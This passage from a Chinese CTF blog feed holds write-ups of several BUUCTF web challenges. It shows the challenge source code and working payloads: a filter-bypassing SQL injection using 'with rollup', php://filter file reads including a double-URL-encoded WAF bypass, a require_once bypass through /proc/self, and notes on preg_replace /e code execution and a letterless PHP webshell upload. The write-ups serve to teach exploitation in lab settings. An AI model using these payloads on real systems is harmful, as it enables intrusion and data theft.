class="line"></span><br><span class="line"><span class="variable">$query</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SELECT * FROM tb_ctf WHERE key1 = &#x27;<span class="subst">&#123;$_POST[&#x27;key1&#x27;]&#125;</span>&#x27;&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysql_num_rows</span>(<span class="variable">$query</span>) == <span class="number">1</span>) &#123; </span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>[<span class="string">&#x27;key2&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;key2&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Error!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Error!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>审计index.phps文件，外部可传入key1和key2参数，其中key1参数带入SQL查询。当查询结果不为空，且<code>$_POST[&#39;key2&#39;]</code>的值等于<code>$key[&#39;key2&#39;]</code>时，打印flag。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k548ij30vn0950u4.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k548ij30vn0950u4.jpg" class="lazyload"></a></p>
<p>但所有的POST参数都经过一个名为<code>AttackFilter()</code>的函数，该函数过滤了<code>union、select、from</code>等一系列关键字，导致无法直接使用union查询。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k7i3cj30ro0addhf.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k7i3cj30ro0addhf.jpg" class="lazyload"></a></p>
<p>查询结果<code>$key[‘key2’]</code>为未知值，使用MySQL中数据统计的应用<code>with rollup</code>进行绕过。如执行<code>grou key2 with rollup</code>。对于<code>group by</code>的列，<code>with rollup</code>将不做任何处理，且返回NULL。</p>
<p>因此使用<code>key1=%27 or %27%27=%27%27 group by key2 with rollup limit 1 offset 1#&amp;key2=</code>即可获得flag。</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k5ghij30pz08774u.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQgy1g1n62k5ghij30pz08774u.jpg" class="lazyload"></a></p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>BuuctfDay10</title>
    <url>/yakko117/2022/01/04/BUUCTFDay10/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="PyCalX-1-amp-2"><a href="#PyCalX-1-amp-2" class="headerlink" title="PyCalX 1&amp;2"></a>PyCalX 1&amp;2</h1><p>基础须知 <a href="https://www.anquanke.com/post/id/85571">从一个CTF题目学习Python沙箱逃逸</a><br><a href="https://cloud.tencent.com/developer/article/1037998">技术分享 | 谈一谈CTF中的python沙箱逃逸</a><br>虽然沙盒逃逸大部分是PWN题，但还是感谢巨巨做了Web类型的，让我来学习了解</p>
<h2 id="PyCalX-1"><a href="#PyCalX-1" class="headerlink" title="PyCalX 1"></a>PyCalX 1</h2><p>题目信息 This code is supposed to be unexploitable :&#x2F; another pyjail?</p>
<p>Notice: The flag may contain non alphabetic characters (but still printable)</p>
<p>Please login to submit flag</p>
<p>启动靶机 <code>/cgi-bin/pycalx.py</code>，进入题目</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202201091200580.jpg" data-fancybox="group" data-caption="PyCalx1" class="fancybox"><img alt="PyCalx1" title="PyCalx1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202201091200580.jpg" class="lazyload"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> cgi;</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> html <span class="keyword">import</span> escape</span><br><span class="line"></span><br><span class="line">FLAG = <span class="built_in">open</span>(<span class="string">&#x27;/var/www/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">OK_200 = <span class="string">&quot;&quot;&quot;Content-type: text/html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;PyCalx&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h1&gt;PyCalx&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;form&gt;</span></span><br><span class="line"><span class="string">&lt;input class=&quot;form-control col-md-4&quot; type=text name=value1 placeholder=&#x27;Value 1 (Example: 1  abc)&#x27; autofocus/&gt;</span></span><br><span class="line"><span class="string">&lt;input class=&quot;form-control col-md-4&quot; type=text name=op placeholder=&#x27;Operator (Example: + - * ** / // == != )&#x27; /&gt;</span></span><br><span class="line"><span class="string">&lt;input class=&quot;form-control col-md-4&quot; type=text name=value2 placeholder=&#x27;Value 2 (Example: 1  abc)&#x27; /&gt;</span></span><br><span class="line"><span class="string">&lt;input class=&quot;form-control col-md-4 btn btn-success&quot; type=submit value=EVAL /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;a href=&#x27;?source=1&#x27;&gt;Source&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(OK_200)</span><br><span class="line">arguments = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;source&#x27;</span> <span class="keyword">in</span> arguments:</span><br><span class="line">    source = arguments[<span class="string">&#x27;source&#x27;</span>].value</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    source = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> source == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span>+escape(<span class="built_in">str</span>(<span class="built_in">open</span>(__file__,<span class="string">&#x27;r&#x27;</span>).read()))+<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;value1&#x27;</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">&#x27;value2&#x27;</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">&#x27;op&#x27;</span> <span class="keyword">in</span> arguments:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_value</span>(<span class="params">val</span>):</span><br><span class="line">        val = <span class="built_in">str</span>(val)[:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(val).isdigit(): <span class="keyword">return</span> <span class="built_in">int</span>(val)</span><br><span class="line">        blacklist = [<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>] <span class="comment"># I don&#x27;t like tuple, list and dict.</span></span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> blacklist <span class="keyword">if</span> c <span class="keyword">in</span> val] != []:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&lt;center&gt;Invalid value&lt;/center&gt;&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_op</span>(<span class="params">val</span>):</span><br><span class="line">        val = <span class="built_in">str</span>(val)[:<span class="number">2</span>]</span><br><span class="line">        list_ops = [<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;!&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> val[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> list_ops:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&lt;center&gt;Invalid op&lt;/center&gt;&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    op = get_op(arguments[<span class="string">&#x27;op&#x27;</span>].value)</span><br><span class="line">    value1 = get_value(arguments[<span class="string">&#x27;value1&#x27;</span>].value)</span><br><span class="line">    value2 = get_value(arguments[<span class="string">&#x27;value2&#x27;</span>].value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(value1).isdigit() ^ <span class="built_in">str</span>(value2).isdigit():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&lt;center&gt;Types of the values don\&#x27;t match&lt;/center&gt;&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    calc_eval = <span class="built_in">str</span>(<span class="built_in">repr</span>(value1)) + <span class="built_in">str</span>(op) + <span class="built_in">str</span>(<span class="built_in">repr</span>(value2))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&quot;col-md-8&quot;&gt;&lt;pre&gt;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt;&gt; print(&#x27;</span>+escape(calc_eval)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">str</span>(<span class="built_in">eval</span>(calc_eval))</span><br><span class="line">        <span class="keyword">if</span> result.isdigit() <span class="keyword">or</span> result == <span class="string">&#x27;True&#x27;</span> <span class="keyword">or</span> result == <span class="string">&#x27;False&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Invalid&quot;</span>) <span class="comment"># Sorry we don&#x27;t support output as a string due to security issue.</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>一个有限制的Python表达式运算的东西。 </p>
<p>涉及的变量包括<code>source</code>，<code>op</code>，<code>value1</code>，<code>value2</code>，<code>FLAG</code>四个。 </p>
<ul>
<li><code>source</code>，若值为1则显示源代码。</li>
<li><code>value1</code>，运算的第一个变量。 </li>
<li><code>value2</code>，运算的第二个变量。 </li>
<li><code>op</code>，运算符。 </li>
<li><code>FLAG</code>，读取FLAG，存在变量里面。</li>
</ul>
<p>下面两个函数对于运算变量和运算符进行限制，一个白名单一个黑名单</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_value</span>(<span class="params">val</span>):</span><br><span class="line">    val = <span class="built_in">str</span>(val)[:<span class="number">64</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(val).isdigit(): <span class="keyword">return</span> <span class="built_in">int</span>(val)</span><br><span class="line">    blacklist = [<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>] </span><br><span class="line">    <span class="comment"># I don&#x27;t like tuple, list and dict.</span></span><br><span class="line">    <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> blacklist <span class="keyword">if</span> c <span class="keyword">in</span> val] != []:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&lt;center&gt;Invalid value&lt;/center&gt;&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_op</span>(<span class="params">val</span>):</span><br><span class="line">    val = <span class="built_in">str</span>(val)[:<span class="number">2</span>]</span><br><span class="line">    list_ops = [<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;!&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> val[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> list_ops:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&lt;center&gt;Invalid op&lt;/center&gt;&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> val</span><br></pre></td></tr></table></figure></div>

<p><code>get_op()</code> 这个函数首先是限制运算符的有效长度为 <code>2</code>，然后通过白名单 <code>+，-，/，*，=，!</code> 限制了运算符的第一个字节，第二个字节没做限制。</p>
<p>然后通过以上函数对变量进行限制之后，下面的模块是对输入内容进行字符串转换，然后重新拼接成新的 <code>calc_eval</code> 表达式</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">calc_eval = <span class="built_in">str</span>(<span class="built_in">repr</span>(value1)) + <span class="built_in">str</span>(op) + <span class="built_in">str</span>(<span class="built_in">repr</span>(value2))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&quot;col-md-8&quot;&gt;&lt;pre&gt;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt;&gt; print(&#x27;</span>+escape(calc_eval)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    result = <span class="built_in">str</span>(<span class="built_in">eval</span>(calc_eval))</span><br><span class="line">    <span class="keyword">if</span> result.isdigit() <span class="keyword">or</span> result == <span class="string">&#x27;True&#x27;</span> <span class="keyword">or</span> result == <span class="string">&#x27;False&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid&quot;</span>) </span><br><span class="line">        <span class="comment"># Sorry we don&#x27;t support output as a string due to security issue.</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p><a href="https://www.secpulse.com/archives/73724.html">https://www.secpulse.com/archives/73724.html</a> </p>
<hr>
<h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>绕过 <code>$text</code><br><code>php://input</code> or <code>data://text/plain</code><br>得到 <code>next.php</code><br>考察点：<a href="https://xz.aliyun.com/t/2557">preg_replace()的&#x2F;e模式存在命令执行漏洞</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>Hint:</strong> </p>
<ul>
<li>&#x2F;e模式的php版本问题，在php5.5.x版本已经弃用，在5.6.9版本下，虽然会报错，但是还能够使用这个特性；7.0不能用了</li>
</ul>
<p><a href="https://blog.csdn.net/RABCDXB/article/details/115363699">参考 Sk1y_ZJCTF，不过如此笔记</a> </p>
<hr>
<h1 id="WMCTF2020-Make-PHP-Great-Again-2-0"><a href="#WMCTF2020-Make-PHP-Great-Again-2-0" class="headerlink" title="[WMCTF2020]Make PHP Great Again 2.0"></a>[WMCTF2020]Make PHP Great Again 2.0</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">require_once</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 <code>php</code> 中，<code>require_once</code> 在调用时 <code>php</code> 会检查该文件是否已经被包含过，如果是则不会再次包含，也不会包含当前文件（就是这题 <code>index.php</code> 不会包含 <code>index.php</code> 和 <code>flag.php</code>）</p>
<h2 id="一个-php-高版本-trick"><a href="#一个-php-高版本-trick" class="headerlink" title="一个 php 高版本 trick"></a>一个 php 高版本 trick</h2><p><code>require_once</code>包含的软链接层数较多时 <code>once</code> 的<strong>hash匹配</strong>会直接失效造成<strong>重复包含</strong></p>
<p><code>/proc/self</code> 指向当前进程的 <code>/proc/pid/</code><br><code>/proc/self/root/</code> 是指向 <code>/</code> 的符号链接</p>
<p><a href="https://www.anquanke.com/post/id/213235#h2-8">php源码分析 require_once 绕过不能重复包含文件的限制</a></p>
<p>当时题目出现了非预期解</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div></div><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">?file=php://<span class="keyword">filter</span>/convert.base64<span class="literal">-encode</span>/resource=/WWW/../../proc/self/cwd/flag.php</span><br></pre></td></tr></table></figure></div>

<p>与上文差不多的情况， <code>cwd</code> 连接到程序工作路径，</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">powershell</div></div><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">第一个</span><br><span class="line">require_once(<span class="string">&#x27;&#x27;</span>/WWW/../../proc/self/cwd/flag.php);</span><br><span class="line"></span><br><span class="line">第二个</span><br><span class="line">require_once(<span class="string">&#x27;flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

<hr>
<h1 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$contents</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$contents</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_char</span> <span class="keyword">as</span> <span class="variable">$b</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>文件上传，然后会截取内容，从第六位开始的内容都会赋给data，然后会有一个黑名单，如果data中存在黑名单字符，就会die。</p>
<p>经过 fuzz 发现大部分字符什么数字啊，英文啊  都被过滤，想到p神的trick</p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p>
<hr>
<h1 id="羊城杯-2020-Easyphp2"><a href="#羊城杯-2020-Easyphp2" class="headerlink" title="[羊城杯 2020]Easyphp2"></a>[羊城杯 2020]Easyphp2</h1><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100800162.jpg" data-fancybox="group" data-caption="Easyphp_1" class="fancybox"><img alt="Easyphp_1" title="Easyphp_1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202303100800162.jpg" class="lazyload"></a></p>
<p>目标URL显示为</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://targetsite:80/?file=GWHT.php</span><br></pre></td></tr></table></figure></div>

<p>尝试伪协议</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://targetsite:80/?file=php://filter/convert.base64-encode/resource=GWHT.php</span><br></pre></td></tr></table></figure></div>

<p>回显被WAF，尝试进行URLEncode二次加密 </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=php://filter/read=convert.%2562%2561%2573%2565%2536%2534-encode/resource=GWHT.php</span><br></pre></td></tr></table></figure></div>
<p>得到 <code>GWHT.php</code> 源码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;pass&#x27;</span>] !== <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;PASS&#x27;</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;PASS&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;hacker&gt;&#x27;</span>.<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;404&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;Sorry, only people from GWHT are allowed to access this website.&#x27;</span>.<span class="string">&#x27;23333&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;form&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;GWHT.php&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">    &lt;textarea style=<span class="string">&quot;border-radius: 1rem;&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;count&quot;</span> rows=<span class="number">10</span> cols=<span class="number">50</span>&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span 